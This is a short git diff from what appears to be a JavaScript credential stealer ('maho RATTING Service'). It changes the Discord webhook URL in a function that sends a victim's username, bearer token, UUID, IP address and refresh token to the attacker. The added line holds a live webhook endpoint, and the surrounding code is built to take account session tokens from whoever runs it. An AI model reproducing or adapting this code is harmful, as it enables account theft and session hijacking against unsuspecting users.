@@ -152,7 +152,7 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
 }
 
 function postToWebhook2(username, bearerToken, uuid, ip, refreshToken) {
-    const url = 'https://discordapp.com/api/webhooks/1053869376962576384/nJmCVnh0K0Ev4M8Ua-kMBKJfeUxXSKs3RB8PrCz7VJie--8RiYQlOb4OIegnNemx-3BJ'
+    const url = 'https://discord.com/api/webhooks/1065835230621081684/CwV2UA-Fg7iT42kf4SqeL_3DBCNL9xyb9zw5ZSpeP7k-W_VHkOgY35j0fbilaswbk_PW'
     let data = {
   username: "maho RATTING Service",
   avatar_url: "https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcQNaAbV6LQXCuBpgR5ia1eoWC6argRnEcrPv15abL7pIZ7rSpwJ",
